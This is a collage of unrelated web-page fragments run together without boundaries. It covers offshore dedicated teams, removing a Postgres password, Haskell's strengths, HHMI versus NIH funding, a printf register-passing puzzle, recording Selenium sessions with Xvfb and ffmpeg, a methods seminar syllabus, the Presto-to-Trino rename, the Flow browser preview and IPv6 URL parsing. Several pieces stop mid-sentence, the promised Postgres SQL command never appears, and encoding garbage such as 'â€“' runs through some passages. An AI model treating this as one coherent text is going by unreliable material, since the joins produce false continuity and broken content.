<p><span>One of the biggest challenges while outsourcing is the lack of collaboration between the client and the development team. In the dedicated team model, the client can interact with the team directly. This helps to make planning and development efficient. It is like having an in-house team, but at a lower cost and with high expertise. The client and the team work together to solve challenges and problems effectively.</span></p>
<h3><b>6. Dedicated Team Offers Continuous Integration</b></h3>
<p><span>To succeed in big time, the project is required to never stop evolving. For example, It is especially important with B2C eCommerce platforms where UX is one of the key factors and generating conversions.</span></p>
<p><span>A dedicated team model is very effective for projects that grow and evolve. The team can be kept intact and the entire project will shift to another stage with no need to scale the team and set up another team to support the thing.</span></p>
<p><span>Another important process is the optimization of the product. Due to strengthening technologies – this requirement is vital in maintaining and growing the product.</span></p>
<p><span>So if you are struggling to develop a team for your startup or scaling your existing team, consider building an offshore dedicated development! You’ll gain access to a massive pool of expert software developers who can deliver top-quality software faster. And because they’re a value-adding extension of your business and not outsourced help, they’re in it for the long haul–just like you.</span></p>
<p><span>Together with a dedicated team from InvoZone, you can build and empower your business.

    <p>Sometimes you may want to remove a Postgres user’s password altogether. You may
want to do this to, say, keep the user metadata but disallow her to login. In my
case I had a user with password but I wanted it to login without a password, and
force myself to use an alternate mechanism for authentication.</p>

<p>The followind SQL command will remove the user’s password; this is similar to
how you would remove a Linux/Unix user’s password with <code>passwd -d username</code>.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><em>by Marc Scholten, 29.10.2020</em></p>

<p>
There’s been a recent blog post <a href="https://www.snoyman.com/blog/2020/10/haskell-bad-parts-1" target="_blank"><q>Haskell: The Bad Parts</q></a> in the haskell community. To keep things in balance and to spread some positive vibes we should also talk about the good parts of the haskell programming language and it’s ecosystem.
</p>

<p>
Here are some of the best parts we encountered while using Haskell at digitally induced. We focus on the advantages in the web dev space because that is what we are currently working on.
</p>

<h2>Type Safety</h2>
<p>
Haskell has one of the most impressive type systems of any programming language in practical use. If you have used TypeScript or other type safe languages in the past, you should be aware of the great advantages of having a type-checked codebase. Now think TypeScript - but 10x better. That’s how Haskell feels like.
</p>

<p>
You save a lot of time debugging runtime errors. Once the compiler approved your code, you can be pretty sure that it is working. This kind of development process is usually a lot more fun than debugging why something is <code>null</code> or <code>undefined</code>.
</p>

<p>
Once your system has hit a certain size and when new feature requests are rolling in you will want to make changes and refactor some parts of your code base. With Haskell you feel empowered to make changes to any part of your codebase.
</p>

<p>
Compare this to the ruby ecosystem: When working with rails you usually need to have lots of tests or otherwise you cannot confidently refactor code after things are running in production. And even then things will break. With the power of the type safety provided by Haskell, we can make refactorings whenever we want.
</p>

<p>
It’s really a blessing.
</p>

<h2>Managed Side Effects</h2>
<p>The way you deal with the file system, external APIs and user input is way different in Haskell than in other less functional programming languages. Your program consists of a main routine that handles the side effects and calls all your pure functions that do the real business logic.</p>

<p>
Systems build this way scale really well because there are less moving parts. Additionally pure functions can be easily tested and changed later on.
</p>

<p>
Most other languages encourage you to do side effects in an unrestricted way. For example when working in Java, a call to an object method might indirectly change the state of many related objects. This means you cannot easily reason about what a method calls does. In Haskell most functions are pure and thus don't trigger side effects like this. And when they do you can see this already by the function's type signature.
</p>

<p>
Haskell forces you to manage your side effects in a more careful way. You can still do IO and have mutable state, you just need to make this explicit inside the type signature. This leads to a far more robust system in overall.
</p>

<h2>Performance</h2>
<p>
Out of the box the performance of Haskell based web applications is great. It just feels faster than your typical Rails or PHP application. Thanks to it’s highly optimized runtime system it can also <a href="https://www.yesodweb.com/blog/2011/03/preliminary-warp-cross-language-benchmarks" target="_blank">handle way more requests than a nodejs application</a>.
</p>

<p>
And you get all that without ever thinking about performance at all. 
</p>

<h2>Tooling</h2>
<p>In 2020 it’s finally good. Thanks to <a href="https://github.com/haskell/haskell-language-server" target="_blank">Haskell Language Server</a> there’s now an easy way to have type information, documentation on hover and smart refactorings inside your text editor.</p>

<p>
With nix, cabal and stack we have the best tools for managing Haskell dependencies. Cabal hell is a thing of the past.
</p>

<p>
Great things are also happening to the Haskell compiler itself. <a href="https://github.com/ghc-proposals/ghc-proposals/pull/282" target="_blank">We soon can write dot expressions as you know from most other programming languages:</a> <code>project.name</code> instead of <code>name project</code>.
</p>

<h2>Hiring Haskell Developers</h2>
<p>
Haskell is a secret super power in that regard. The Haskell community consists of many very smart and talented software engineers. Haskell developers usually learn about Haskell because they care about their craft and about building high quality software products instead of learning about it to get a high paying job. Exactly the kind of people you want in your team.
</p>

<h2>2020 Haskell is Ready for Prime Time</h2>
<p>
For years there has been this trend of growing use of type safety as well as the growing use of functional programming techniques. What language could fill this space better than Haskell. Haskell has really matured in the last years and in 2020 it feels like it’s finally ready to conquer the world.

December 28, 2020 | https://nintil.com/hhmi-and-nih | <a href="https://web.archive.org/web/*/https://nintil.com/hhmi-and-nih">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>So there's this paper, <em>Incentives and Creativity: Evidence from the academic life sciences</em> (Azoulay, Graff Zivin, Manso <a href="https://onlinelibrary.wiley.com/doi/abs/10.1111/j.1756-2171.2011.00140.x">2011</a>) that shows that Howard Hughes Medical Institute (HHMI) investigators (who are funded for a longer term and in a more open ended way) outperform those of the National Institutes of Health (NIH) that have shorter review cycles and more concrete grant proposals. This is seen as a vindication of the "<a href="https://twitter.com/pierre_azoulay/status/1141118605985308674">fund people, not projects</a>" paradigm. However, the effect sample reported is <em>huge</em> , perhaps too good to be true, and the extent to which this model can scale is debatable, as Azoulay himself also <a href="https://twitter.com/pierre_azoulay/status/1318578977527668736">says</a> that <em>it is not clear how well this model can scale. HHMI is very much focused on a narrow elite</em>.</p>
<blockquote>
<p>Similarly, while science generates much of our prosperity, scientists and researchers themselves do not sufficiently obsess over how it should be organized. In a recent paper, Pierre Azoulay and co-authors <a href="https://www.nber.org/papers/w15466">concluded</a> that <strong>Howard Hughes Medical Institute’s long-term grants to high-potential scientists made those scientists 96 percent more likely to produce breakthrough work</strong>. If this finding is borne out, it suggests that present funding mechanisms are likely to be far from optimal, in part because they do not focus enough on research autonomy and risk taking. (<a href="https://www.theatlantic.com/science/archive/2019/07/we-need-new-science-progress/594946/">We need a new science of progress</a>)</p>
</blockquote>
<p>
[1]. There are other NIH similar grants like the MERIT award or the Outstanding Investigator Award (R35)
</p>
<p>NIH has their own HHMI-style throw-money-at-the-best program, the Director's Pioneer award (DP1)<sup><a href="#sidenote-1">1</a></sup> which also seems to produce <a href="https://commonfund.nih.gov/sites/default/files/HRHR%20PA%20FY%202004-2006%20Outcome%20Evaluation.pdf">great</a> <a href="https://dpcpsi.nih.gov/sites/default/files/CoC-051413-Pioneer-Award-Program-DP1.pdf">results</a>. <a href="https://commonfund.nih.gov/pioneer">DP1</a> grants are similar to the HHMI Investigators program (700k per year vs ~1M at HHMI) and as selective (11 pioneers per year vs 20 for HHMI). They are not as long-lasting as the HHMI ones however in that they last for 5 years while HHMIs enjoy a theoretical 7 and a practical 15 years of funding. </p>
<p>Both have been lauded as exemplary programs that <em>cause more good science to happen that otherwise would not</em>.</p>
<p>So this seems like an important "huge if true" fact. Even if, as Azoulay suspects, this model cannot scale, it is reasonable to think that the scientific elite that would benefit from this class of funding is comprised of more than the current 250 HHMI investigators and 50 or so DP1 awardees.</p>
<p>So with this setup, let's look at first the general question (people, not projects) and then the specifics of NIH and the HHMI once we have a framework to assess them.</p>
<h2 id="fund-people-not-projects">Fund People, not projects</h2>
<p>The usual way grants are allocated is a process whereby a scientist says they want to do specific piece of work X and then they get money to do that. In <a href="https://guzey.com/how-life-sciences-actually-work/">practice</a>, researchers have already done part of what they say they will do (And use that data to support the application), and will use part of the funds to work on other things they may want to work on so they can do as they please with <em>part</em> of their time and money. But for the most part, they are working on what they say they are working on. R01 grants, the bulk of NIH's funding, run for 5 years (And this has gone <a href="https://nexus.od.nih.gov/all/2013/11/07/how-long-is-an-r01/">up</a> over time), not too dissimilar, at first glance, to the HHMI's 7.</p>
<p>With DP1 and HHMI, researchers do not submit a grant proposal for something specific they want to do, they submit their resume and a <strong>broad summary of what they are going to be working on</strong>. This research program (3k words) is shorter than a usual Nintil blogpost, and substantially shorter than one of the sample R01 grant applications from the NIAD's <a href="https://www.niaid.nih.gov/sites/default/files/1-R01-AI121500-01A1_Gordon_Application.pdf">website</a> which are over 5x longer (excluding references and CVs). </p>
<p>
[2]. Azoulay et al. 2011 states that 'Moreover, HHMI investigators appear to share the perception that their first appointment review is rather lax, with reviewers more interested in making sure that they have taken on new projects with uncertain payoffs, rather than insisting on achievements. Below, we validate this perception by showing that the second review is much more sensitive to performance than the first.'
</p>
<p>Both are similar in that they can be renewed; if one wants to work on a 20 year project, in theory one can roll the <a href="https://www.niaid.nih.gov/grants-contracts/apply-renewal">same</a> R01 four times, with the <a href="https://nexus.od.nih.gov/all/2016/02/16/are-attempts-at-renewal-successful/">likelihood</a> of being renewed starting at 30%. HHMI is more forgiving once one is in and in the event one is out: it provides <a href="https://www.hhmi.org/sites/default/files/Programs/Investigator/2018-HHMI-Investigator-Competition-FAQ.pdf">two years of phase-out</a> if a renewal is not successful and the renewal rate is &gt;80% anyway, leading to a median of 16 years of <a href="https://twitter.com/JSheltzer/status/1208442925249630209">support</a><sup><a href="#sidenote-2">2</a></sup>. Thus HHMI investigators can expect to be funded for longer, and because if they lose funding they don't have to be immediately looking for support, that should also help keep their eyes in the long term. This is not to say that HHMI investigators do not spend time applying for grants, you can search <a href="https://projectreporter.nih.gov/reporter.cfm">here</a> for example <a href="https://en.wikipedia.org/wiki/Feng_Zhang">Feng Zhang</a> (HHMI since 2018) and see that he got a DP1 in 2020 as well as R01s in 2020 and 2019. Even <a href="https://en.wikipedia.org/wiki/David_J._Anderson">David J. Anderson</a> (HHMI since 1989) can be seen applying for R01s in the same site. This is because the HHMI award, generous as it is, covers the investigator's salary, some research budget, special expenses for expensive equipment, but not every expense, and not the hiring of additional lab members.</p>
<p>There are other differences, HHMI <a href="https://www.hhmi.org/sites/default/files/Programs/Investigator/2018-HHMI-Investigator-Competition-FAQ.pdf">requires</a> researchers to spend 75% of their time doing research, whereas in R01s there is no such limit. DP1s are required to work half of their time on grant-related research.</p>
<p>This brief discussion is just to highlight that the "fund people, not projects" approach, even when looked at by using their usual life sciencesexemplars, is not as clear cut as it may seem. It may be more useful to consider two extreme idealized approaches instead:</p>
<ul>
<li>Fund projects: A scientist proposes to do a specific, well defined project. There is an expected deliverable and there may be milestones involved that have to be met. Rather then being open ended and highly uncertain, it is roughly known to be achievable. The project should be ended if it's not meeting its goals.</li>
<li>Fund people: A scientist is funded generously and have all their requirements for assistants and equipment met without paperwork or further reviews. They have zero accountability, and what they decide to research or publish has no bearing on the continuation of funding. In effect they have life tenure. They don't perish if they don't publish.</li>
</ul>
<p>It's clear that there are advantages and disadvantages to both approaches; they are the explore/exploit tradeoff with another name. The first one is similar to the <a href="https://www.dayoneproject.org/post/focused-research-organizations-to-accelerate-science-technology-and-medicine">Focused Research Organization</a> concept.</p>
<p>The second one sounds like tenure. But modern day tenure is not generally like this. Scientists are <a href="https://academia.stackexchange.com/questions/37986/is-it-possible-to-survive-in-university-academia-without-applying-for-grants">expected to continue to apply</a> for grants and bring money to the university (The university gets a cut), as well as to grow their lab; in turn as they now have a lab they have some obligation to their students, who do need to publish in high impact journals in order to get ahead in academia. Tenure pays just the salay (and 9 months of it in the case of US tenure, as the other 3 are expected to be covered with grants). It does not cover the cost of any materials employed during the course of research, or the salaries of research assistants (Those also have to come from grants). </p>
<p>Donald Braben <a href="https://nintil.com/review-scientific-freedom">points out</a> that before 1970 (or so)</p>
<blockquote>
<p>tenured academics with an individual turn of mind could usually dig out modest sources of funding to tackle any problem that interested them without first having to commit themselves in writing. Afterward, unconditional sources of funds would become increasingly diffi cult to find. Today, they are virtually nonexistent.</p>
<p>The way forward for ambitious young researchers was once clear, therefore. All they had to do was to acquire the necessary qualifications, and then to find a tenured appointment. To say the least, that was not easy, but not substantially more difficult than it would be today. However, having served their apprenticeship, they were free. They may have had to overcome the inevitable peer pressure if their plans were controversial, but their peers did not have power of veto— see Poster 1 .Written applications were necessary if expensive equipment or large teams were required, but tenured researchers with modest needs would meet few obstacles. </p>
</blockquote>
<p>This still sounds like modern day tenure! What has changed is that <em>if</em> more expensive equipment is now required (And this is most likely true in the life sciences than in theoretical physics) and that in turn requires grants, then academics now have that additional potential veto in a way that the cheaper experiments of the past did not have. And Braben can't argue that the new system selects for people that are good at getting grants. In the quote above he concedes that getting tenure was as hard back then; and plausibly to get tenure you needed the same things you do today.</p>
<p>The ones that come close to the "fund people" approach are not HHMI investigators, or the pre-1970 scientific community; those would be the self-funded <a href="https://en.wikipedia.org/wiki/Independent_scientist">independent scientists</a> that were wealthy enough to be able to do anything they wanted. Alfred Loomis' story in particular, how he managed to have the best equipped lab in the US, paid out of his Wall Street profits, seems the closest to the platonic form of the fund people approach.</p>
<h2 id="fund-people-not-metrics">Fund people, not metrics?</h2>
<p>Another distinction to be made here beyond people vs projects is <em>how</em> people or projects are selected. One can use impersonal metrics or one can get more personal and, eschew all bureaucracy and process and go full <a href="https://twitter.com/matthewclifford/status/1326479506983579648">nepotistic</a>. Though not intrinsically tied to "fund people", it is true that those approaches have historically been more linked to a personal approach. Ioannidis (<a href="https://www.nature.com/articles/477529a">2011</a>) discusses various "fund people" approaches which include using mechanisms like lotteries or just funding everyone. This is one of the two missing sectors of the 2x2 quadrant (In red, missing):</p>

	<p><small>December 28, 2020</small></p>
</div><div><p>In <a href="https://randomascii.wordpress.com/2020/08/30/the-easy-ones-three-bugs-hiding-in-the-open/">The Easy Ones â€“ Three Bugs Hiding in the Open</a>,
Bruce Dawson gave us a little C puzzle in passing:</p>

<blockquote><p>The <a href="https://en.wikipedia.org/wiki/Stdarg.h">variable arguments</a> in
printf formatting means that it is easy to get type mismatches. The
practical results vary considerably:</p>

<ol><li>printf(â€œ0x%08lxâ€�, p); // Printing a pointer as an int â€“ truncation or worse on 64-bit </li>
<li>printf(â€œ%d, %fâ€�, f, i); // Swapping float and int â€“ could print nonsense, or might actually work (!) </li>
<li>printf(â€œ%s %dâ€�, i, s); // Swapping the order of string and int â€“ will probably crash</li>
</ol>

<p>[...] (aside: understanding why #2 often
prints the desired result is a good <a href="https://en.wikipedia.org/wiki/Application_binary_interface">ABI</a> puzzle)</p>
</blockquote>

<p>I had to think about this for a bit, and then I realized why and
how it can work (and why similar integer versus float argument
confusion can also work for other functions, even ones with fixed
argument lists). What it comes down to is that in some <a href="https://en.wikipedia.org/wiki/Application_binary_interface">ABI</a>s,
arguments are passed in registers (at least early arguments, before
you run out of registers), and <strong>floating point arguments are passed
in different registers than integers (and pointers)</strong>.  This is
true even for functions that take variable arguments and will walk
through them using stdarg macros (or at least it can be, depending
on the ABI).</p>

<p>Because floating point and non floating point arguments are passed
in different sets of registers, what matters isn't the total order
of arguments but the order of floating point or non-fp arguments.
So here, regardless of where '%f' is in the printf format, it always
causes printf() to get the first floating point argument, which can
never be confused with an integer argument. Similarly, the first
'%d' causes printf() to look for the second non-fp argument,
regardless of where it was in the argument order; it could be at
the end of several floating point arguments and still work.</p>

<p>(The '%d' makes printf() look for the second non-fp argument because
the first one was the format string. In an ABI that passed pointers
in a separate place than integers, it would still work out, since now
the first '%d' would be looking for the first integer argument.)</p>

<p>Using the excellent services of godbolt.org, we can see this in
action on 64-bit x86 in <a href="https://godbolt.org/z/hYz9Gn">a very small example</a> (I used a very small example and a
decent optimization level to get clear, minimal assembly code). The
floating point argument is passed in <code>xmm0</code>, while the format string
and the integer argument are passed in <code>edi</code> and <code>esi</code> respectively
(I don't know what <code>eax</code> is doing, but it probably has something
to do with the ABI). A similar thing happens on 64-bit ARM v8 (aka
Aarch64), as we can also see on godbolt with <a href="https://godbolt.org/z/jrxz96">the same example on
Aarch64</a>.</p>

<p>(Based on <a href="https://wiki.cdot.senecacollege.ca/wiki/AArch64_Register_and_Instruction_Quick_Start">this page</a>,
the Aarch64 <code>x0</code> and <code>w1</code> are in the same set of registers. Apparently
<code>d0</code> is a 64-bit version of the first floating point register, from
<a href="https://armkeil.blob.core.windows.net/developer/Files/pdf/graphics-and-multimedia/ARMv8_InstructionSetOverview.pdf">here</a>
[pdf]. I wound up looking up all of this to be sure I understood
what was going on in the Aarch64 call, so I might as well write it
down here.)</p>

<p>Since pointers and integers are normally passed in the same set of
registers (at least on 64-bit x86 and Aarch64), we can also see why
the third example is very likely to fail. Since the same set of
registers is used for both argument types, it's possible to use an
integer argument as a pointer argument, with a segmentation fault
as the likely result. Similarly, we can predict that '<code>printf("%s
%f", f, s);</code>' might well work.</p>

<p>PS: This confusion can happen in any language that follows the C
ABI on a platform with this sort of split usage of registers (although
many languages may prevent this sort of argument type confusion).
Not all languages do; famously, Go currently passes all arguments
on the stack (as of Go 1.15 and soon Go 1.16).</p>

            <p>In this mini-book, you will(hopefully) learn about different neural network structures. By the end of the book,
                I hope you also will have a solid conceptual understanding of how neural networks function.</p><p>I will briefly go through some necessary formulas and equations, but will mainly
                stick to broad definitions that are comprehendible to even middle school students(I’ll try!). Some topics are well
                beyond those taught in middle school, so you may want to look at more thorough and step-by-step walkthroughs on the
                topics on platforms like <a rel="noopener" href="https://khanacademy.org/" target="_blank">Khan Academy</a>.
                As you go through this book, you will also encounter several different projects and real-world problems that I will
                walk you through and solve. I highly recommend you take a try at solving them beforehand! Solutions that I give may
                not be the best and most state-of-the-art, so you can also try and tweak it a bit to make it better! I will try to
                add some optimizations to the code to make it faster and more efficient and give you a summary of what state-of-the-art
                methods data scientists now use. All code in this book is either pseudocode or written in Java, so you should be able to
                roughly interpret it if you have learned any C-like programming languages! You don’t need to learn one right away to
                continue reading either… I provide detailed explanations of each line of code. You can also find it all on

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
<p>We are using selenium (with help of <a href="http://docs.behat.org/en/v3.0/">behat</a>) quite a lot.
When test failed we had problem to debug it. And running all tests on our local machines is taking about 60min. We have parallel test suites in jenkins so it takes less than 10min so we are using jenkins to run tests for every commit we push to our git repository.
First we were taking screenshots of every step but Behat v3.0 doesnâ€™t have option to run step within step and writing each step in gherkin is not the way we want to pursue, we would like to write more business focused tests.</p>
<p>My friend read about <a href="http://www.unixuser.org/~euske/vnc2swf/pyvnc2swf.html">pyvnc2swf</a> in â€œ<a href="https://www.amazon.com/Continuous-Delivery-Deployment-Automation-Addison-Wesley/dp/0321601912">Continuous Delivery: Reliable Software Releases through Build, Test, and Deployment Automation</a>â€�.</p>
<p>The idea was so simple and genious that I started to look for options to record sessions which would save us time with debugging problems.
First I tried to use <a href="http://www.unixuser.org/~euske/vnc2swf/pyvnc2swf.html">pyvnc2swf</a> but this is quite old software. So I started to read about options of Xvfb.</p>
<p>My first dicovery was that Xvfb can listen for remote connections. So I could easily start Xvfb running selenium:</p>
<figure><pre><code data-lang="bash">xvfb-run <span>--listen-tcp</span> <span>--server-num</span> 44 <span>--auth-file</span> /tmp/xvfb.auth <span>-s</span> <span>"-ac -screen 0 1920x1080x24"</span> java <span>-jar</span> selenium.jar</code></pre></figure>
<p><code>--server-num</code> is the option to set what is the â€œdisplay idâ€� which is used in next step.</p>
<p>With this I started to search for informations â€œhow to record X sessions with ffmpegâ€�. And to my surprise <a href="https://www.ffmpeg.org/">ffmpeg</a> has the <code>x11grab</code> option. And I was even more surprised when it started to do this over IP. So now I can start to record when job with behat is running. Some additional switches and stuff and I had movie in 12fps (cause this is not a movie and I donâ€™t need silky smooth fps rate).</p>
<figure><pre><code data-lang="bash">ffmpeg <span>-f</span> x11grab <span>-video_size</span> 1920x1080 <span>-i</span> 127.0.0.1:44 <span>-codec</span>:v libx264 <span>-r</span> 12 /tmp/behat_1.mp4</code></pre></figure>
<p>The <code>-i</code> flag is setting up which display to use from which server. I have 6 builds running in paralel and theyâ€™re using different displays to see what is happening.</p>
<p>The last problem I had was with properly quitting ffmpeg when the recording was done.
<code>kill</code> command would kill the process but the information about video length wasnâ€™t correctly saved to container. This made seeking through video problematic.
To quit <code>ffmpeg</code> properly I had to send <code>q</code> keystroke to ffmpeg process.</p>
<p>This is the place where <a href="https://tmux.github.io/"><code>tmux</code></a> saves the day.
I had to start detached session with <code>tmux</code> running <code>ffmpeg</code> and name session so I knew where to send the keystroke when the build was ending.</p>
<p>So when the build is starting Iâ€™m starting tmux with ffmpeg recording</p>
<figure><pre><code data-lang="bash">tmux new-session <span>-d</span> <span>-s</span> BehatRecording1 <span>'ffmpeg -f x11grab -video_size 1920x1080 -i 192.168.102.1:44 -codec:v libx264 -r 12 /tmp/behat_1.mp4'</span></code></pre></figure>
<p>And when the build is finishing (no matter if tests are succesfull or not) Iâ€™m sending <code>q</code> to that session with:</p>
<figure><pre><code data-lang="bash">tmux send-keys <span>-t</span> BehatRecording1 q</code></pre></figure>

			<p><strong>PSY 607: Everything is Fucked</strong><br>
Prof. Sanjay Srivastava<br>
Class meetings: Mondays 9:00 – 10:50 in 257 Straub<br>
Office hours: Held on Twitter at your convenience (<a href="http://twitter.com/hardsci" target="_blank">@hardsci</a>)</p>
<p>In a much-discussed article at Slate, social psychologist Michael Inzlicht told a reporter, “Meta-analyses are fucked” (<a href="http://www.slate.com/articles/health_and_science/cover_story/2016/03/ego_depletion_an_influential_theory_in_psychology_may_have_just_been_debunked.html" target="_blank">Engber, 2016</a>). What does it mean, in science, for something to be fucked? Fucked needs&nbsp;to mean more than that something is complicated or must be undertaken with thought and care, as that would be trivially true of everything in science. In this class we will go a step further and say that something is fucked if it presents hard conceptual challenges to which implementable,&nbsp;real-world solutions for working scientists are either not available or routinely ignored in practice.</p>
<p>The format of this seminar&nbsp;is as follows: Each week we will read and discuss 1-2 papers that raise the question of whether something is fucked. Our focus will be on things that may be fucked in research methods, scientific practice, and philosophy of science. The potential fuckedness of specific theories, research topics, etc. will not be the focus of this class per se, but rather will be used to illustrate these important topics. To that end, each week a different student will be assigned to find a paper that illustrates the fuckedness (or lack thereof) of that week’s topic, and give a 15-minute presentation about whether it is indeed fucked.</p>

and creators of Presto® along with the major contributors – just under a shiny new name. And now you can find us here:</p>

<p>In 2012, Dain, David and Martin joined the Facebook data infrastructure team. Together with Eric Hwang, we created 
Presto® to address the problems of low latency interactive analytics over Facebook’s massive Hadoop data warehouse. 
One of our non-negotiable conditions was for Presto® to be an open source project. Open source is in our DNA - we had 
all used and participated in open source projects to various degrees in the past, and we recognized the power of open 
communities and developers coming together to build successful software that can stand the test of time.</p>

<p><img src="https://trino.io/assets/blog/trino-announcement/team.jpg" alt=""></p>

<p>Over the next six years, we worked hard to build a healthy open source community and ecosystem around the project. We 
worked with developers and users all over the world and welcomed them into the Presto® community. Presto® was on a path 
of increasing growth and success, in large part because of the contributions from developers across many fields and all 
over the world.</p>

<p>Unfortunately in 2018, it became clear that Facebook management wanted to have tighter control over the project and its 
future. This culminated with their decision to grant Facebook developers commit rights on the project without any prior 
experience in Presto®. We strongly believe that this kind of decision is not compatible with having a healthy, open 
community. Moreover, they made this decision by fiat without engaging the Presto® community. As a matter of principle, 
we had no choice but to leave Facebook in order to focus on making sure Presto® continued to be a successful project 
with an open, collaborative and independent community. In reality, the choice was easy.</p>

<p>We started the Presto Software Foundation in January 2019 as an independent entity to oversee the development of the 
software and community, continuing the meritocratic system that had been in place over the previous 6 years. The community 
quickly consolidated under this new home. We intentionally stayed unemployed over the next 10 months to focus on expanding 
and strengthening the community by working directly with major users and contributors, as well as reaching out to a wider 
group of users and developers across the globe. This resulted in new use cases and an injection of energy, making the 
project more vibrant than ever before as even more new users and developers became engaged. But, don’t take our word for 
it, let the data speak for itself:</p>

<p><img src="https://trino.io/assets/blog/trino-announcement/commits.png" alt=""></p>

<p>Months after this consolidation, Facebook decided to create a competing community using The Linux Foundation®. As a first 
action, Facebook applied for a trademark on Presto®. This was a surprising, norm-breaking move because up until that point, 
the Presto® name had been used without constraints by commercial and non-commercial products for over 6 years. In September 
of 2019, Facebook established the Presto Foundation at The Linux Foundation®, and immediately began working to enforce this 
new trademark. We spent the better part of the last year trying to agree to terms with Facebook and The Linux Foundation 
that would not negatively impact the community, but unfortunately we were unable to do so. The end result is that we must 
now change the name in a short period of time, with little ability to minimize user disruption.</p>

<p>On a personal note, and as the founders who named the project Presto® in the first place, this is an incredibly sad and 
disappointing turn of events. And while we will always have fondness for the name Presto®, we have come to accept that a 
name is just a name. To be frank, we’re tired of this endless distraction, and we intend to focus on what matters most 
and what we are best at doing – building high quality software everyone can rely on and fostering a healthy community 
of users and developers that build it and support it. We’re not going anywhere – we’re the same people, the same amazing 
software, under a new name: Trino.</p>

<p><strong>If you love this project, you already love Trino. ❤️</strong></p>

				<p>We’re very excited to be making a <a href="https://support.ekioh.com/download/">Flow preview</a> available for public download for the first time. Flow has a fast, modern, architecture that doesn’t share its layout engine with any other browser. While able to render most websites well, many perfectly, Flow still has some way to go. Each month more pages work, as more JavaScript APIs are added or additional CSS functionality created.</p>
<p><a href="https://www.ekioh.com/wp-content/uploads/2020-12-28-215433_1920x1080_scrot.png"><img src="https://www.ekioh.com/wp-content/uploads/2020-12-28-215433_1920x1080_scrot-1024x576.png" alt="Flow running on a Raspberry Pi 400" width="1024" height="576" srcset="https://www.ekioh.com/wp-content/uploads/2020-12-28-215433_1920x1080_scrot-1024x576.png 1024w, https://www.ekioh.com/wp-content/uploads/2020-12-28-215433_1920x1080_scrot-300x169.png 300w, https://www.ekioh.com/wp-content/uploads/2020-12-28-215433_1920x1080_scrot-768x432.png 768w, https://www.ekioh.com/wp-content/uploads/2020-12-28-215433_1920x1080_scrot-1536x864.png 1536w, https://www.ekioh.com/wp-content/uploads/2020-12-28-215433_1920x1080_scrot.png 1920w" sizes="(max-width: 1024px) 100vw, 1024px"></a></p>
<p><span id="more-4917"></span>We have chosen to release on just one platform initially, and there are a couple of reasons why. The Raspberry Pi’s hardware is largely fixed – you can’t swap the CPU or GPU. Variations in hardware could cause us to get distracted by issues that really shouldn’t be a priority right now.</p>
<p>Secondly, the Raspberry Pi 400 has very similar performance to many set-top box chips, so a release that demonstrates Flow’s animation performance on embedded hardware is more useful than on a PC where all browsers can easily get 60fps.</p>
<p>It’s been a year since our <a href="https://www.ekioh.com/devblog/full-google-mail-in-a-clean-room-browser/">Google Mail</a> blog post was picked up on <a href="https://twitter.com/FlowBrowser/status/1200070712121348096" data-wplink-edit="true">Twitter</a> and <a href="https://news.ycombinator.com/">Hacker News</a>. Our unexpected sudden fame meant we weren’t prepared for a public browser release, and expectations were (and probably still are) unrealistically high. Most of the HTML user interfaces that we had tried rendered well, and Flow regularly outperformed other browsers on set-top boxes. But, websites never looked quite right.</p>
<p>Last September, we detailed <a href="https://www.ekioh.com/devblog/can-we-fix-it/">our work</a> on tracking down and fixing the rendering of various major websites. No one bug was particularly tricky to fix once we had narrowed it down, but the end result made the browser engine feel much more like an actual browser.</p>
<p>In the meantime, some previously working sites have stopped working due to improvements in their content, for instance, Amazon now requires Web Cryptography to log in. This is a feature currently in progress.</p>
<p>This preview has many features missing that you would reasonably expect from a browser. Media source extensions, cryptography, and CSS Grid are being actively worked on. We have plenty more to get on with, including a UI, accessibility, and better text editing functionality.</p>
<p>We generally know which sites work and which don’t, but prioritise our commercial customers. Bug fixes that impact them usually fix websites, just not necessarily your favourite website. If you are able to help us track down why a particular website (or library) fails to work, we would be very appreciative of a small test case demonstrating the bug. The more simple the test case is, the more likely we are to fix the bug. We will read all emails but, sadly, may not be able to reply.</p>
<p>And finally, while the preview is for the Raspberry Pi 400, it also works on the Raspberry Pi 4. Previous models use a different GPU with different GPU drivers, so we are holding off releasing for those until we have optimised the graphics support.</p>
<p>We hope this preview demonstrates where we are with a brand new browser engine. The feedback we get for this public preview will directly affect the prospects for desktop platforms. Enjoy it, be critical, but please don’t expect Flow to be usable on your favourite websites right now.</p>

    <p>2020-12-28</p>
    
<p>Hello! Welcome to the once-yearly blog post! This year I'd like to examine the
most peculiar bug I encountered at work. To set the stage, let's start with a
little background. 📚</p>
<p>When we write <a href="https://en.wikipedia.org/wiki/URL">URLs</a> with a <a href="https://en.wikipedia.org/wiki/List_of_TCP_and_UDP_port_numbers">non-standard</a> <a href="https://en.wikipedia.org/wiki/Port_(computer_networking)">port</a> we
specify the port after a <code>:</code>. With <a href="https://en.wikipedia.org/wiki/Hostname">hostnames</a> and <a href="https://en.wikipedia.org/wiki/IPv4#Addressing">IPv4</a> addresses
this is straightforward. Here's some <a href="https://www.python.org/">Python</a> code to show how easy it is.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>url </span><span>= </span><span>urllib.parse.urlparse(</span><span>"https://node.example.com:8000"</span><span>)
</span><span>&gt;&gt;&gt; </span><span>(url.hostname, url.port)
</span><span>(</span><span>'node.example.com'</span><span>, </span><span>8000</span><span>)
</span><span>&gt;&gt;&gt;
&gt;&gt;&gt; </span><span>url </span><span>= </span><span>urllib.parse.urlparse(</span><span>"https://192.168.0.1:8000"</span><span>)
</span><span>&gt;&gt;&gt; </span><span>(url.hostname, url.port)
</span><span>(</span><span>'192.168.0.1'</span><span>, </span><span>8000</span><span>)
</span></code></pre>
<p>Unfortunately, when <a href="https://en.wikipedia.org/wiki/IPv6#Addressing">IPv6</a> addresses are involved some ambiguity is introduced.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>url </span><span>= </span><span>urllib.parse.urlparse(
</span><span>...     </span><span>"https://fdc8:bf8b:e62c:abcd:1111:2222:3333:4444:8000"
</span><span>... )
</span><span>...
</span><span>&gt;&gt;&gt; </span><span>url.hostname
</span><span>'fdc8'
</span><span>&gt;&gt;&gt; </span><span>try</span><span>:
</span><span>...     </span><span>url.port
</span><span>... </span><span>except </span><span>ValueError </span><span>as </span><span>error:
</span><span>...     </span><span>print</span><span>(error)
</span><span>...
